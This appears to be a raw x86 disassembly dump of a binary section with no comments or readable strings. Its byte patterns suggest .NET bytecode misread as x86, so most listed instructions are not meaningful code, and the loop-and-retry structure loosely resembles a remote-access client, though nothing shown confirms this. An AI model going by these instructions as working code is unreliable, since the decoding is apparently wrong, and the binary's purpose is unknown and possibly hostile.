  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	6a 01                	push   $0x1
  4028d9:	00 70 80             	add    %dh,-0x80(%eax)
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	6d                   	insl   (%dx),%es:(%edi)
  4028e2:	02 00                	add    (%eax),%al
  4028e4:	70 80                	jo     0x402866
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	20 03                	and    %al,(%ebx)
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	d3 03                	roll   %cl,(%ebx)
  4028f7:	00 70 80             	add    %dh,-0x80(%eax)
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	e7 03                	out    %eax,$0x3
  402901:	00 70 80             	add    %dh,-0x80(%eax)
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	0f 04                	(bad)
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	69 04 00 70 80 08 00 	imul   $0x88070,(%eax,%eax,1),%eax
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	1c 05                	sbb    $0x5,%al
  40291f:	00 70 80             	add    %dh,-0x80(%eax)
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	77 17                	ja     0x402940
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	2a 1f                	sub    (%edi),%bl
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	dd 1f                	fstpl  (%edi)
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	90                   	nop
  402946:	20 00                	and    %al,(%eax)
  402948:	70 80                	jo     0x4028ca
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	43                   	inc    %ebx
  402956:	21 00                	and    %eax,(%eax)
  402958:	70 80                	jo     0x4028da
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	47                   	inc    %edi
  402960:	21 00                	and    %eax,(%eax)
  402962:	70 80                	jo     0x4028e4
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	fa                   	cli
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 04 22 00       	add    $0x220472,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	04 22                	add    $0x22,%al
  402aa1:	00 70 73             	add    %dh,0x73(%eax)
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 06 22    	add    %esp,0x22067216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
